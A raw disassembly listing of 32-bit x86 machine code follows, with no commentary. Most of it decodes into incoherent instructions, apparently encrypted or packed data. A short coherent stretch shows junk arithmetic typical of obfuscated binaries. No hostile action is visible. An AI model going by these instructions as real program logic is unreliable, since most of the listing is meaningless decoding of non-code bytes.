  41144c:	test   DWORD PTR [ecx+0x1f],edx
  41144f:	pop    edi
  411450:	repz add DWORD PTR [ebx+ebp*8-0x31194729],eax
  411458:	and    esp,esp
  41145a:	sti    
  41145b:	mov    dh,0x92
  41145d:	dec    ebx
  41145e:	outs   dx,DWORD PTR ds:[esi]
  41145f:	cmp    eax,0x31353392
  411464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411465:	pop    ds
  411466:	cmp    ch,BYTE PTR [ebp+0x4bfb3ea1]
  41146c:	fcomp  QWORD PTR [eax+ebx*2+0x23c8d07d]
  411473:	cdq    
  411474:	add    BYTE PTR [ebx+0x3b],0xc0
  411478:	mov    dl,0xea
  41147a:	(bad)
  41147d:	test   DWORD PTR ds:0x81bb7939,edx
  411483:	push   ebp
  411484:	jnp    0x41149e
  411486:	mov    al,ah
  411488:	mov    ecx,0x70da1a09
  41148d:	sbb    al,0xaf
  41148f:	leave  
  411490:	push   eax
  411491:	(bad)  
  411493:	adc    bl,dl
  411495:	in     al,0x3c
  411497:	pop    ss
  411498:	clc    
  411499:	dec    edx
  41149a:	xor    DWORD PTR [ebp-0x77b824e3],0x4755df1
  4114a4:	xor    BYTE PTR [ebp+0x9],0x20
  4114a8:	(bad)  
  4114a9:	jmp    0x41151a
  4114ab:	loopne 0x41151b
  4114ad:	sub    edx,ecx
  4114af:	ret    0x6f16
  4114b2:	enter  0x7fd4,0x46
  4114b6:	jbe    0x411484
  4114b8:	push   ds
  4114b9:	xchg   edx,eax
  4114ba:	dec    ebp
  4114bb:	es mov al,0xbe
  4114be:	out    0x18,al
  4114c0:	mov    dh,0xb7
  4114c2:	ins    DWORD PTR es:[edi],dx
  4114c3:	adc    esp,DWORD PTR [ebp+0x39]
  4114c6:	hlt    
  4114c7:	or     edx,DWORD PTR [ebx+0x42]
  4114ca:	push   edx
  4114cb:	xchg   esi,eax
  4114cc:	inc    esi
  4114cd:	dec    edx
  4114ce:	jmp    0xe1cb:0xe8da42ac
  4114d5:	mov    eax,ds:0xdb50c8f3
  4114da:	pop    ebp
  4114db:	test   BYTE PTR [edx+0x1c4d32f],bl
  4114e1:	push   edx
  4114e2:	int3   
  4114e3:	jg     0x4114a2
  4114e5:	aas    
  4114e6:	stc    
  4114e7:	lods   eax,DWORD PTR ds:[esi]
  4114e8:	mov    dl,0xa
  4114ea:	ds out 0x76,al
  4114ed:	pop    ebp
  4114ee:	or     eax,0x1267fa0f
  4114f3:	loop   0x41148e
  4114f5:	or     BYTE PTR [ebp+0x48f22915],al
  4114fb:	jmp    0x6a0c:0x935cc09c
  411502:	(bad)  
  411503:	fld    DWORD PTR [edx]
  411505:	shl    BYTE PTR ds:0xe2534f10,cl
  41150b:	dec    esp
  41150c:	inc    ecx
  41150d:	xlat   BYTE PTR ds:[ebx]
  41150e:	inc    esi
  41150f:	jp     0x41151e
  411511:	imul   ebx,DWORD PTR ds:0x4ebbd0a5,0xb
  411518:	pop    ebx
  411519:	enter  0x7b10,0x7c
  41151d:	lods   eax,DWORD PTR ds:[esi]
  41151e:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  411520:	std    
  411521:	jmp    0xac9b2aa8
  411526:	std    
  411527:	cdq    
  411528:	and    BYTE PTR [edi],ah
  41152a:	and    al,0xfa
  41152c:	cmp    al,0xe0
  41152e:	cmp    DWORD PTR [eax],edx
  411530:	dec    esi
  411531:	cli    
  411532:	or     al,0x1
  411534:	sub    ebx,DWORD PTR [ebx]
  411536:	add    ch,BYTE PTR [edx+ebx*2-0x189e5c96]
  41153d:	test   al,0x69
  41153f:	aas    
  411540:	mov    dl,0xb2
  411542:	and    eax,0x502ff827
  411547:	xchg   esi,eax
  411548:	outs   dx,BYTE PTR ds:[esi]
  411549:	inc    edx
  41154a:	dec    edi
  41154b:	push   0xffffffa0
  41154d:	pop    ds
  41154e:	enter  0xa93f,0x4a
  411552:	push   edi
  411553:	adc    BYTE PTR [ebp-0x28674c49],dl
  411559:	sub    BYTE PTR [ebx+edi*1-0xe],dh
  41155d:	in     al,dx
  41155e:	ret    0x32a
  411561:	xor    ah,BYTE PTR ds:0xe90c45ff
  411567:	pop    edi
  411568:	cld    
  411569:	(bad)  
  41156a:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	mov    bh,0xc5
  411583:	sub    eax,0x7e41802b
  411588:	jle    0x41157b
  41158a:	jg     0x41160a
  41158c:	jle    0x411608
  41158e:	push   ss
  41158f:	(bad)  
  411590:	in     al,0x6c
  411592:	cmp    eax,0x1a2c9ab7
  411597:	mov    esp,0xf9560bf4
  41159c:	mov    WORD PTR [edx-0x5f],?
  41159f:	dec    ecx
  4115a0:	push   esi
  4115a1:	fst    DWORD PTR [edx]
  4115a3:	mov    al,ds:0x1cb4524e
  4115a8:	ja     0x41157f
  4115aa:	sub    edx,DWORD PTR [esi+0x65]
  4115ad:	mov    eax,0x38353541
  4115b2:	add    esp,DWORD PTR [ebx-0x63]
  4115b5:	inc    esi
  4115b6:	in     al,dx
  4115b7:	ins    DWORD PTR es:[edi],dx
  4115b8:	mov    cl,0xf9
  4115ba:	fcomp  DWORD PTR [eax-0x185d2e20]
  4115c0:	not    BYTE PTR [edi+0x67]
  4115c3:	mov    BYTE PTR [esi+0x39],dl
  4115c6:	mov    ebp,0x51ba0393
  4115cb:	dec    ecx
  4115cc:	jbe    0x411573
  4115ce:	mov    al,0x78
  4115d0:	xor    ah,dl
  4115d2:	out    dx,eax
  4115d3:	and    al,0x3d
  4115d5:	pop    ds
  4115d6:	sahf   
  4115d7:	dec    esi
  4115d8:	popa   
  4115d9:	dec    ebx
  4115da:	mov    ah,0xfd
  4115dc:	(bad)  
  4115dd:	jle    0x41159e
  4115df:	xlat   BYTE PTR ds:[ebx]
  4115e0:	cdq    
  4115e1:	stos   DWORD PTR es:[edi],eax
  4115e2:	sbb    al,0x63
  4115e4:	retf   
  4115e5:	pop    ebx
  4115e6:	xor    al,BYTE PTR [ecx]
  4115e8:	dec    ecx
  4115e9:	cmc    
  4115ea:	dec    ebx
  4115eb:	loop   0x41164d
  4115ed:	push   0x68e8d026
  4115f2:	test   al,0xa7
  4115f4:	inc    edx
  4115f5:	out    dx,al
  4115f6:	mov    bl,0xe
  4115f8:	sub    al,0x47
  4115fa:	stos   BYTE PTR es:[edi],al
  4115fb:	cli    
  4115fc:	pop    ebp
  4115fd:	add    BYTE PTR [esi],0xf1
  411600:	dec    edi
  411601:	aam    0x2
  411603:	dec    esi
  411604:	js     0x411616
  411606:	xchg   DWORD PTR [eax-0x7e5283eb],esp
  41160c:	test   eax,0xd179836e
  411611:	cmp    edi,edi
  411613:	into   
  411614:	mov    ebx,0xd33efb96
  411619:	mov    ch,0x99
  41161b:	repz arpl WORD PTR [esi+0x6c87b4c],ax
  411622:	loop   0x411637
  411624:	add    DWORD PTR [ebp-0x75ce4005],esi
  41162a:	adc    BYTE PTR [edi+0x28fe600c],dh
  411630:	add    eax,0xdc4db810
  411635:	jns    0x411607
  411637:	pop    es
  411638:	mov    dh,0x7c
  41163a:	sub    eax,0x2c4525d5
  41163f:	repz loopne 0x4115e5
  411642:	out    dx,al
  411643:	xchg   ecx,eax
  411644:	add    al,0x99
  411646:	in     al,0x7b
  411648:	ss jg  0x4115f1
  41164b:	mov    BYTE PTR [eax-0x7e],0x97
  41164f:	mov    ah,0x11
  411652:	mov    al,ds:0x693a073e
  411657:	mov    ch,0x76
  411659:	rcr    BYTE PTR [esi+0x51],1
  41165c:	push   edi
  41165d:	dec    edi
  41165e:	popf   
  41165f:	xchg   esi,eax
  411660:	sbb    eax,0xbb347646
  411665:	and    edi,DWORD PTR [ecx+edi*8]
  411668:	jne    0x411671
  41166a:	aas    
  41166b:	xchg   edx,eax
  41166c:	cwde   
  41166d:	cld    
  41166e:	cmp    esi,DWORD PTR [eax+0x54]
  411671:	ds pop edi
  411673:	out    0xc5,eax
  411675:	dec    ebx
  411676:	pop    ebx
  411677:	repnz pop ebp
  411679:	adc    bh,BYTE PTR [ecx+ebp*2+0x5e]
  41167d:	in     al,0x63
  41167f:	push   edx
  411680:	outs   dx,BYTE PTR ds:[esi]
  411681:	dec    ebx
  411682:	xchg   BYTE PTR [esi-0x7d9a4a9d],ch
  411688:	lea    ecx,ds:0x36cfc3a6
  41168e:	xchg   DWORD PTR [eax+0x3b],edx
  411691:	xor    eax,0xed1425b1
  411696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411697:	sub    ah,BYTE PTR [ebp+ebp*8-0x7a15631]
  41169e:	add    BYTE PTR [ebx],ah
  4116a0:	pop    esp
  4116a1:	es jne 0x411652
  4116a4:	or     edx,DWORD PTR [esi+0x1f]
  4116a7:	pushf  
  4116a8:	xchg   esi,eax
  4116a9:	das    
  4116aa:	xor    eax,0x44c4844a
  4116af:	mov    bh,0x99
  4116b1:	popf   
  4116b2:	push   ecx
  4116b3:	ins    BYTE PTR es:[edi],dx
  4116b4:	jnp    0x4116b2
  4116b6:	jg     0x4116aa
  4116b8:	js     0x411701
  4116ba:	scas   eax,DWORD PTR es:[edi]
  4116bb:	fild   QWORD PTR ds:0xa4d3a58f
  4116c1:	mov    ds:0xcc940d91,eax
  4116c6:	lock mov edx,0xdcad0058
  4116cc:	sbb    cl,bh
  4116ce:	xchg   edx,eax
  4116cf:	pushf  
  4116d0:	add    DWORD PTR [ebp-0x6e],eax
  4116d3:	ss inc ecx
  4116d5:	sti    
  4116d6:	cmc    
  4116d7:	fld    QWORD PTR [ebx+ebx*1+0x7d90f0f7]
  4116de:	adc    BYTE PTR [edx+0x2b],bh
  4116e1:	imul   eax,ebx,0xd57ceaa2
  4116e7:	aad    0xeb
  4116e9:	ins    BYTE PTR es:[edi],dx
  4116ea:	cmp    al,0xf6
  4116ec:	das    
  4116ed:	mov    ch,0x71
  4116ef:	not    DWORD PTR ds:[ebx-0x2b]
  4116f3:	or     bl,dh
  4116f5:	or     al,0x16
  4116f7:	push   eax
  4116f8:	fild   WORD PTR [ecx+0x9cff553]
  4116fe:	xlat   BYTE PTR ds:[ebx]
  4116ff:	lahf   
  411700:	(bad)  
  411701:	fstp   DWORD PTR [eax-0x7a]
  411704:	std    
  411705:	popa   
  411706:	pusha  
  411707:	sbb    BYTE PTR [ebp-0x743d2e6f],al
  41170d:	dec    ebp
  41170e:	adc    BYTE PTR [ebx],al
  411710:	(bad)  
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4336ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4336fb,0x4336c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433703,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43372b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4336bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0xa00c9dd
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x411736
  41178e:	xchg   ecx,eax
  41178f:	mov    ?,WORD PTR [esp+ebx*4]
  411792:	adc    eax,0xd792c2d
  411797:	sub    eax,0xed67fc7a
  41179c:	adc    dl,bh
  41179e:	mov    al,0x5a
  4117a0:	mov    esp,0xedc9313d
  4117a5:	xor    esp,ecx
  4117a7:	ja     0x41178d
  4117a9:	jnp    0x411801
  4117ab:	mov    eax,es
  4117ad:	fsubr  st(5),st
  4117af:	inc    edi
  4117b0:	cmp    DWORD PTR [ecx],esi
  4117b2:	test   eax,0x206bf5d9
  4117b7:	(bad)  
  4117b9:	out    dx,eax
  4117ba:	xlat   BYTE PTR ds:[ebx]
  4117bb:	rcl    BYTE PTR [ebx-0x5e],cl
  4117be:	icebp  
  4117bf:	bound  ebp,QWORD PTR [ebx+0x23658b76]
  4117c5:	xlat   BYTE PTR gs:[ebx]
  4117c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117c8:	pop    ds
  4117c9:	cmc    
  4117ca:	jo     0x411838
  4117cc:	inc    esp
  4117cd:	gs cmp esi,eax
  4117d0:	(bad)  
  4117d1:	shl    BYTE PTR [edx+0x8],1
  4117d4:	cmp    eax,0xcaa812ed
  4117d9:	xchg   esp,eax
  4117da:	add    DWORD PTR [edi-0x6c],edx
  4117dd:	jl     0x411815
  4117df:	jmp    0x411765
  4117e1:	repnz mov ebx,0x3f9ac3ab
  4117e7:	xchg   BYTE PTR [esi+0x32e0a97e],ah
  4117ed:	sbb    al,0x4c
  4117ef:	mov    ebp,0x7569b372
  4117f4:	xchg   ecx,eax
  4117f5:	shl    BYTE PTR [ecx],0xc8
  4117f8:	in     eax,dx
  4117f9:	inc    ebx
  4117fa:	push   esi
  4117fb:	lea    ebx,[eax+0x31]
  4117fe:	shl    DWORD PTR [ebx+0x36153541],cl
  411804:	call   0x96df:0xef34a4ca
  41180b:	jbe    0x41184d
  41180d:	xor    eax,0x46e5db11
  411812:	pop    esi
  411813:	adc    BYTE PTR es:[esi+0x49e4cfb0],al
  41181a:	retf   
  41181b:	dec    esp
  41181c:	in     eax,0x3
  41181e:	cs aas 
  411820:	pop    ds
  411821:	nop
  411822:	adc    DWORD PTR [ebx-0x56330911],ebp
  411828:	into   
  411829:	hlt    
  41182a:	mov    esp,0x65770233
  41182f:	test   al,0x4a
  411831:	push   0xffffffe3
  411833:	pop    ebp
  411834:	and    al,dh
  411836:	cli    
  411837:	pop    esi
  411838:	mov    al,dl
  41183a:	adc    edx,DWORD PTR [esi]
  41183c:	out    0x7f,eax
  41183e:	sub    al,0xe6
  411840:	mov    al,ds:0xc6fa8f94
  411845:	es (bad) 
  411847:	xchg   edi,eax
  411848:	loopne 0x411878
  41184a:	and    ebp,ecx
  41184c:	xchg   edi,eax
  41184d:	lock sbb ebx,esi
  411850:	inc    ebp
  411851:	or     al,0x3
  411853:	outs   dx,BYTE PTR ds:[esi]
  411854:	pop    ecx
  411855:	enter  0x9e9d,0xde
  411859:	cmc    
  41185a:	(bad)  
  41185b:	fisttp WORD PTR [edx]
  41185d:	dec    edi
  41185e:	sub    BYTE PTR [ecx],bh
  411860:	stc    
  411861:	(bad)  
  411862:	in     al,0x69
  411864:	jo     0x41189c
  411866:	mov    bl,BYTE PTR [eax]
  411868:	jge    0x411833
  41186a:	cs push ebx
  41186c:	mov    bl,0x91
  41186e:	dec    esp
  41186f:	mov    ds:0xc19e787f,al
  411874:	ds retf 
  411876:	sub    al,0x15
  411878:	sbb    al,0x82
  41187a:	hlt    
  41187b:	sub    al,0x55
  41187d:	test   al,0x9a
  41187f:	repnz lock mov esp,0x2f1d3070
  411886:	mov    WORD PTR [ecx],fs
  411888:	adc    ebp,esi
  41188a:	mov    ecx,0x9d5b2fd5
  41188f:	mov    dl,0xdf
  411891:	and    eax,0x36e99be1
  411896:	cwde   
  411897:	push   ebp
  411898:	dec    edi
  411899:	adc    eax,eax
  41189b:	fisub  DWORD PTR [ebx-0x4544016a]
  4118a1:	cwde   
  4118a2:	pop    esp
  4118a3:	mov    ebx,DWORD PTR [ecx+eax*1-0x24]
  4118a7:	in     eax,0x80
  4118a9:	sub    eax,0xed3c7c96
  4118ae:	jns    0x411848
  4118b0:	push   esi
  4118b1:	adc    DWORD PTR [ecx-0x30840f53],edx
  4118b7:	sbb    BYTE PTR [edx+0x390286e8],dl
  4118bd:	cmp    DWORD PTR [edx+0x33c9c1a0],0xffffffc3
  4118c4:	jne    0x4118e4
  4118c6:	std    
  4118c7:	(bad)  
  4118c8:	mov    ebx,0x5797874f
  4118cd:	(bad)  
  4118ce:	jg     0x41188b
  4118d0:	sbb    ebp,esi
  4118d2:	call   0x5fd42293
  4118d7:	stos   BYTE PTR es:[edi],al
  4118d8:	xchg   esi,eax
  4118d9:	ins    BYTE PTR es:[edi],dx
  4118da:	xchg   al,ah
  4118dc:	push   eax
  4118dd:	sbb    eax,DWORD PTR [ebx]
  4118df:	push   0xbc723142
  4118e4:	sti    
  4118e5:	pop    eax
  4118e6:	inc    esi
  4118e7:	inc    ebx
  4118e8:	fs cmp ebx,esi
  4118eb:	or     DWORD PTR [esi+0x32121f63],0xffffffa8
  4118f2:	(bad)  
  4118f4:	and    eax,0x39ca8b6c
  4118f9:	mov    eax,0x63bdee47
  4118fe:	popf   
  4118ff:	shl    edi,cl
  411901:	gs mov ecx,0xb478df
  411907:	adc    cl,BYTE PTR [edx+0x40506f44]
  41190d:	mov    esi,0xf5008bc
  411912:	nop
  411913:	and    ebp,0x584a0493
  411919:	(bad)  
  41191b:	fcmovnbe st,st(6)
  41191d:	and    BYTE PTR ds:0xfb1c67ec,0x5f
  411924:	test   eax,0x132b58f3
  411929:	fldcw  WORD PTR [edx-0x3e]
  41192c:	pop    edi
  41192d:	jge    0x4118f2
  41192f:	scas   eax,DWORD PTR es:[edi]
  411930:	sahf   
  411931:	mov    dh,0xc0
  411933:	pop    edx
  411934:	cld    
  411935:	inc    ebx
  411936:	cmc    
  411937:	fwait
  411938:	addr16 lahf 
  41193a:	pop    es
  41193b:	inc    edi
  41193c:	mov    esp,0x222afe95
  411941:	or     DWORD PTR [esi+0x63ffe],ebp
  411947:	xchg   edx,eax
  411948:	jmp    0x41195e
  41194a:	int3   
  41194b:	int    0xb4
  41194d:	out    0x54,eax
  41194f:	dec    esp
  411950:	xchg   BYTE PTR [edx-0x28d9c424],al
  411956:	cmp    eax,0xb6bd0887
  41195b:	sar    BYTE PTR [ebp+esi*1-0x2521ee3e],0xac
  411963:	adc    eax,0xf95eea0
  411968:	add    cl,cl
  41196a:	sti    
  41196b:	mov    ds:0xcfc75743,al
  411970:	ror    DWORD PTR ds:[ecx-0x44bdafb0],cl
  411977:	int3   
  411978:	aas    
  411979:	mov    esp,cs
  41197b:	lock inc ebx
  41197d:	sub    ebp,DWORD PTR [eax+0x43]
  411980:	mov    edx,0x3fcc2e0
  411985:	cmp    DWORD PTR [eax],eax
  411987:	daa    
  411988:	ficomp DWORD PTR [esi+0x70]
  41198b:	xor    ch,BYTE PTR [esi]
  41198d:	adc    BYTE PTR [edx+0x527628c2],cl
  411993:	outs   dx,BYTE PTR ds:[esi]
  411994:	iret   
  411995:	call   0xb4d22224
  41199a:	jp     0x411a0d
  41199c:	pop    es
  41199d:	push   DWORD PTR [ecx+0x30c24db3]
  4119a3:	cmp    ebx,DWORD PTR [edx+0x42]
  4119a6:	mov    al,ds:0xc3da7f37
  4119ab:	add    ecx,DWORD PTR [eax+0x3c]
  4119ae:	or     DWORD PTR ds:0x433623,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433727,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433727
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433727,eax
  4119d6:	cmp    DWORD PTR ds:0x433727,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433727,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x7b
  411a13:	push   eax
  411a14:	fisub  WORD PTR [ebp+eiz*1+0x4d]
  411a18:	jle    0x411a98
  411a1a:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411a1e:	jnp    0x411a95
  411a20:	rol    DWORD PTR [ecx],1
  411a22:	add    eax,0xc0ecfab6
  411a27:	xor    DWORD PTR [edx],esi
  411a29:	sbb    ebp,DWORD PTR [edi]
  411a2b:	aam    0x71
  411a2d:	outs   dx,DWORD PTR ds:[esi]
  411a2e:	in     eax,0x6b
  411a30:	rol    DWORD PTR [edi+0x1f460156],1
  411a36:	mov    BYTE PTR [ebx-0x43f6ed54],cl
  411a3c:	scas   eax,DWORD PTR es:[edi]
  411a3d:	xor    ch,BYTE PTR [edi+0x53c10860]
  411a43:	test   eax,0x86b8eae2
  411a48:	mov    ch,0x1e
  411a4a:	dec    ebp
  411a4b:	cld    
  411a4c:	push   edi
  411a4d:	imul   ebp,ebx,0x6d032442
  411a53:	aas    
  411a54:	push   ss
  411a55:	inc    esi
  411a56:	inc    esp
  411a57:	test   BYTE PTR [edx-0x70d0e323],ch
  411a5d:	fmul   QWORD PTR [ecx-0x38]
  411a60:	jg     0x411a0a
  411a62:	mov    al,ds:0x1b94a2c2
  411a67:	icebp  
  411a68:	bound  esp,QWORD PTR [ecx]
  411a6a:	push   ebx
  411a6b:	cmp    ebx,edx
  411a6d:	xchg   ebx,eax
  411a6e:	retf   0x10b6
  411a71:	(bad)  
  411a72:	les    edx,FWORD PTR [ecx]
  411a74:	aas    
  411a75:	fld    DWORD PTR [ebx+0x1e3e018d]
  411a7b:	push   esp
  411a7c:	gs enter 0xff41,0x7a
  411a81:	xor    esp,eax
  411a83:	cmp    eax,0x22ed8d9
  411a88:	(bad)  
  411a8a:	lods   eax,DWORD PTR ds:[esi]
  411a8b:	push   ss
  411a8c:	ja     0x411a71
  411a8e:	(bad)  
  411a8f:	mov    edx,0x864414ed
  411a94:	add    BYTE PTR [eax+ebx*1+0x7f],cl
  411a98:	ja     0x411a6d
  411a9a:	xchg   BYTE PTR [edx],ah
  411a9c:	jb     0x411a97
  411a9e:	cld    
  411a9f:	jbe    0x411a41
  411aa1:	pop    ebp
  411aa2:	or     al,0xc3
  411aa4:	mov    edi,ds
  411aa6:	sti    
  411aa7:	clc    
  411aa8:	jns    0x411a63
  411aaa:	cmp    eax,0x49c7d9c6
  411aaf:	inc    edx
  411ab0:	aam    0x73
  411ab2:	in     eax,dx
  411ab3:	loop   0x411b03
  411ab5:	rol    cl,cl
  411ab7:	inc    edx
  411ab8:	xor    DWORD PTR [esi-0x29],0x7e
  411abc:	inc    edx
  411abd:	stos   DWORD PTR es:[edi],eax
  411abe:	dec    ebp
  411abf:	mov    BYTE PTR [eax+0x79],dh
  411ac2:	inc    ebx
  411ac3:	imul   bh
  411ac5:	into   
  411ac6:	sar    bh,1
  411ac8:	je     0x411a71
  411aca:	fild   DWORD PTR [ebx+0x45]
  411acd:	enter  0x633f,0xcd
  411ad1:	retf   
  411ad2:	xchg   ebx,eax
  411ad3:	cmp    eax,0xe4cfc8b1
  411ad8:	in     al,0x22
  411ada:	std    
  411adb:	out    dx,eax
  411adc:	lea    eax,[edi+0x24]
  411adf:	jb     0x411b43
  411ae1:	inc    ecx
  411ae2:	and    eax,0xfdeb14cd
  411ae7:	and    BYTE PTR [eax+0x30],dl
  411aea:	repz mov ah,0xfd
  411aed:	mov    edi,0x46670738
  411af2:	das    
  411af3:	push   edi
  411af4:	sub    ecx,0xffffffaa
  411af7:	mov    ebx,0x5c5940e8
  411afc:	adc    BYTE PTR [ebp+0x5],dh
  411aff:	jle    0x411adb
  411b01:	ret    
  411b02:	mov    ds:0x1e516954,al
  411b07:	shl    DWORD PTR [esi-0x655e7e7a],1
  411b0d:	gs mov dl,0x1c
  411b10:	xchg   edi,eax
  411b11:	mov    al,ds:0x5764d3bb
  411b16:	pop    es
  411b17:	stos   BYTE PTR es:[edi],al
  411b18:	retf   
  411b19:	cmp    ebx,DWORD PTR [edi-0x181f56fc]
  411b1f:	jne    0x411b6f
  411b21:	dec    edi
  411b22:	jp     0x411ab5
  411b24:	push   0xb43a61da
  411b29:	or     esp,DWORD PTR [ebx-0x2c]
  411b2c:	push   esp
  411b2d:	cli    
  411b2e:	mov    eax,ds:0x41008df
  411b33:	sbb    BYTE PTR [ebp+0x5dddd9ff],dh
  411b39:	dec    esi
  411b3a:	mov    esi,0x88cd3391
  411b3f:	push   ss
  411b40:	rol    BYTE PTR [esi-0x24],0xb
  411b44:	xchg   esp,eax
  411b45:	mov    cs,WORD PTR [ecx-0x3b0ea1eb]
  411b4b:	dec    edx
  411b4c:	jo     0x411b5d
  411b4e:	mov    dl,0xdd
  411b50:	add    eax,0x4cba86f
  411b55:	jno    0x411b04
  411b57:	fnstenv [edx-0xf7f728c]
  411b5d:	neg    DWORD PTR [ebx+eax*2]
  411b60:	shl    BYTE PTR [edi-0x59bdd33d],0x5b
  411b67:	aam    0x81
  411b69:	dec    edi
  411b6a:	xchg   esi,edi
  411b6c:	cld    
  411b6d:	jo     0x411b3a
  411b6f:	idiv   eax
  411b71:	dec    ebp
  411b72:	jmp    0x1412:0x292394ff
  411b79:	je     0x411b02
  411b7b:	in     al,dx
  411b7c:	inc    ecx
  411b7d:	in     al,dx
  411b7e:	jle    0x411bd6
  411b80:	fst    DWORD PTR [eax]
  411b82:	sbb    DWORD PTR [eax],ebp
  411b84:	or     eax,0x2acc993a
  411b89:	push   ebp
  411b8a:	lea    esp,[edx+0x33]
  411b8d:	xchg   ebp,eax
  411b8e:	sbb    ebx,ebp
  411b90:	mov    DWORD PTR [ecx+0x7f],esp
  411b93:	leave  
  411b94:	cmp    bh,BYTE PTR [ebp+0x77f846d4]
  411b9a:	xchg   esi,eax
  411b9b:	cmp    BYTE PTR [edx-0x12907dc4],0x5e
  411ba2:	popa   
  411ba3:	sahf   
  411ba4:	in     eax,dx
  411ba5:	sar    DWORD PTR ds:0x63c691b4,0x8d
  411bac:	xchg   esp,eax
  411bad:	fcomp  st(4)
  411baf:	repnz es sub al,0x67
  411bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bb4:	mov    esi,0xfb307264
  411bb9:	pushf  
  411bba:	or     DWORD PTR [ebp-0x68],edi
  411bbd:	cs add al,0xb7
  411bc0:	cli    
  411bc1:	push   es
  411bc2:	aam    0xef
  411bc4:	arpl   WORD PTR [esi],bp
  411bc6:	sbb    ch,ch
  411bc8:	push   edx
  411bc9:	mov    ds:0xdcf4ef5b,al
  411bce:	in     al,0xc6
  411bd0:	push   esp
  411bd1:	push   ss
  411bd2:	adc    BYTE PTR [edx+0x9309c24],dl
  411bd8:	sub    ah,dl
  411bda:	icebp  
  411bdb:	daa    
  411bdc:	inc    esi
  411bdd:	test   eax,0x15d57228
  411be2:	out    dx,al
  411be3:	fnsave [eax-0x397f9712]
  411be9:	ficomp WORD PTR [ebx+edx*2+0x31bf1726]
  411bf0:	jecxz  0x411bb7
  411bf2:	add    dl,BYTE PTR [ecx+esi*2-0x59791583]
  411bf9:	jg     0x411be7
  411bfb:	mov    dl,0xd6
  411bfd:	jmp    0xb025:0xa5b11377
  411c04:	imul   edx,DWORD PTR ds:0xd7c2f03b,0x11
  411c0b:	call   0x2265:0xdbdaa043
  411c12:	das    
  411c13:	adc    DWORD PTR [ecx-0x67b3015c],eax
  411c19:	nop
  411c1a:	div    bh
  411c1c:	push   ds
  411c1d:	and    dh,BYTE PTR [ebx+0x2d]
  411c20:	iret   
  411c21:	cld    
  411c22:	jg     0x411ba4
  411c24:	mov    dh,0x3c
  411c26:	mov    dh,0xf5
  411c28:	xchg   edx,eax
  411c29:	push   edx
  411c2a:	inc    esi
  411c2b:	add    BYTE PTR [edx+0x17],0xe0
  411c2f:	inc    edi
  411c30:	loope  0x411c4d
  411c32:	jl     0x411bf9
  411c34:	mov    bl,0x71
  411c36:	fxch   st(6)
  411c38:	adc    dl,BYTE PTR [eax]
  411c3a:	inc    esp
  411c3b:	or     esi,DWORD PTR [ebx]
  411c3d:	ret    0x8b56
  411c40:	jne    0x411c4a
  411c42:	mov    ecx,0x32729b
  411c47:	add    eax,ecx
  411c49:	jmp    0x411e84
  411c4e:	mov    WORD PTR [eax-0x1a6d186e],cs
  411c54:	imul   esi,DWORD PTR [ecx-0x48],0x7bdad6c4
  411c5b:	sahf   
  411c5c:	and    ebx,DWORD PTR [edi+eax*8]
  411c5f:	dec    ebx
  411c60:	jle    0x411ce0
  411c62:	adc    BYTE PTR [esi+edi*2+0x7e],bh
  411c66:	dec    edx
  411c67:	inc    esp
  411c68:	push   ds
  411c69:	fisubr WORD PTR [ebp+0x4a]
  411c6c:	gs inc eax
  411c6e:	ins    BYTE PTR es:[edi],dx
  411c6f:	mov    ds:0x97fc56f8,al
  411c74:	pop    es
  411c75:	fidivr WORD PTR [ebp-0x22]
  411c78:	stos   BYTE PTR es:[edi],al
  411c79:	jne    0x411c74
  411c7b:	pop    ebx
  411c7c:	fimul  WORD PTR [esi-0x1e]
  411c7f:	mov    dl,0xcf
  411c81:	or     ebx,ecx
  411c83:	call   0xe74f4686
  411c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c89:	ret    0x5951
  411c8c:	xchg   esi,eax
  411c8d:	pushf  
  411c8e:	retf   
  411c8f:	pop    ss
  411c90:	mov    ds:0x5cab9c35,eax
